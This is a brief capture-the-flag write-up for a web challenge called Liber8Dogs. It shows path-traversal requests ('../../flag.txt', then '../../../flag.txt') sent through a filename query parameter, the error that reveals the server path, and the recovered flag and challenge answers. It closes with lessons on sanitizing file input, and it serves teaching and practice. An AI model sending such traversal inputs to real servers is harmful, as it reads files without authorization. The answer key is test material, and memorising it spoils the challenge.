# 🧠 CTF Write-up: Liber8Dogs (Easy, 100 pts)

## 🧩 Challenge Summary

> "Liber8tion posted a dog gallery. Can you find a vulnerability and locate the flag in `flag.txt`?"

## 🔍 Recon

- Site listed images with links like: `/dog?filename=Tibs.jpg`
- This hinted at a file being read based on a query parameter

## 🧪 Exploitation

### Step 1: Path Traversal Test

Sent:
```
/dog?filename=../../flag.txt
```

Got error:
```
No such file or directory: '/app/static/dogs/../../flag.txt'
```

Confirmed:
- The app is building file paths using `filename` from `/app/static/dogs/`
- Our `../` was *not sanitized*, so traversal is allowed

### Step 2: Try Going Up Three Levels

Sent:
```
/dog?filename=../../../flag.txt
```

Bingo:
```
SKY-BUPE-2348
```

## ✅ Final Answers

- Q1: `/dog`
- Q2: `SKY-BUPE-2348`

## 🎯 Lessons Learned

- Always sanitize file inputs on the backend
- Avoid exposing file readers to user-controlled input without constraints
